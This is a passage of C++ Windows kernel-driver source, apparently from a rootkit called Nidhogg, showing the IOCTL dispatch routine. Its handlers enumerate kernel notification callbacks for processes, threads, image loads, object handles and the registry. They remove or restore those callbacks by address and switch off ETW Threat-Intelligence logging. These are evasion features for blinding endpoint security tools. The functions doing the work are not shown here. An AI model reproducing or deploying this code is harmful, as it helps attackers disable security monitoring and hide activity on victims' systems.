		auto data = (ObCallbacksList*)Irp->AssociatedIrp.SystemBuffer;

		if (data->NumberOfCallbacks == 0 && data->Callbacks) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		switch (data->Type) {
		case ObProcessType:
		case ObThreadType: {
			status = NidhoggAntiAnalysis->ListObCallbacks(data);
			break;
		}
		default:
			status = STATUS_INVALID_PARAMETER;
		}

		len += sizeof(ObCallbacksList);
		break;
	}

	case IOCTL_NIDHOGG_LIST_PSROUTINES:
	{
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size % sizeof(PsRoutinesList) != 0) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (PsRoutinesList*)Irp->AssociatedIrp.SystemBuffer;

		switch (data->Type) {
		case PsImageLoadType:
		case PsCreateProcessTypeEx:
		case PsCreateProcessType: 
		case PsCreateThreadType:
		case PsCreateThreadTypeNonSystemThread: {
			status = NidhoggAntiAnalysis->ListPsNotifyRoutines(data, NULL, NULL);
			break;
		}
		default:
			status = STATUS_INVALID_PARAMETER;
		}

		len += sizeof(PsRoutinesList);
		break;
	}
	case IOCTL_NIDHOGG_LIST_REGCALLBACKS:
	{
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size % sizeof(CmCallbacksList) != 0) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (CmCallbacksList*)Irp->AssociatedIrp.SystemBuffer;
		status = NidhoggAntiAnalysis->ListRegistryCallbacks(data, NULL, NULL);

		len += sizeof(CmCallbacksList);
		break;
	}

	case IOCTL_NIDHOGG_REMOVE_CALLBACK:
	{
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size % sizeof(KernelCallback) != 0) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (KernelCallback*)Irp->AssociatedIrp.SystemBuffer;

		if (data->CallbackAddress <= 0) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		switch (data->Type) {
		case PsImageLoadType:
		case PsCreateProcessType:
		case PsCreateProcessTypeEx:
		case PsCreateThreadType:
		case PsCreateThreadTypeNonSystemThread:
		case ObProcessType:
		case ObThreadType:
		case CmRegistryType: {
			status = NidhoggAntiAnalysis->RemoveCallback(data);
			break;
		}
		default:
			status = STATUS_INVALID_PARAMETER;
		}

		if (!NT_SUCCESS(status))
			KdPrint((DRIVER_PREFIX "Failed to remove callback (0x%08X)\n", status));

		len += sizeof(KernelCallback);
		break;
	}

	case IOCTL_NIDHOGG_RESTORE_CALLBACK:
	{
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size % sizeof(KernelCallback) != 0) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (KernelCallback*)Irp->AssociatedIrp.SystemBuffer;

		if (data->CallbackAddress <= 0) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		switch (data->Type) {
		case PsImageLoadType:
		case PsCreateProcessType:
		case PsCreateProcessTypeEx:
		case PsCreateThreadType:
		case PsCreateThreadTypeNonSystemThread:
		case ObProcessType:
		case ObThreadType: 
		case CmRegistryType: {
			status = NidhoggAntiAnalysis->RestoreCallback(data);
			break;
		}
		default:
			status = STATUS_INVALID_PARAMETER;
		}

		if (!NT_SUCCESS(status))
			KdPrint((DRIVER_PREFIX "Failed to restore callback (0x%08X)\n", status));

		len += sizeof(KernelCallback);
		break;
	}

	case IOCTL_NIDHOGG_ENABLE_DISABLE_ETWTI:
	{
		if (!Features.EtwTiTamper) {
			KdPrint((DRIVER_PREFIX "Due to previous error, etwti tampering is unavaliable.\n"));
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size % sizeof(ULONG) != 0) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (ULONG*)Irp->AssociatedIrp.SystemBuffer;

		if (*data != 1 && *data != 0) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		status = NidhoggAntiAnalysis->EnableDisableEtwTI((bool)*data);

		if (!NT_SUCCESS(status))
			KdPrint((DRIVER_PREFIX "Failed to tamper ETWTI (0x%08X)\n", status));

		len += sizeof(ULONG);
		break;
	}

	default:
		status = STATUS_INVALID_DEVICE_REQUEST;
		break;
	}

	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = len;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return status;
}
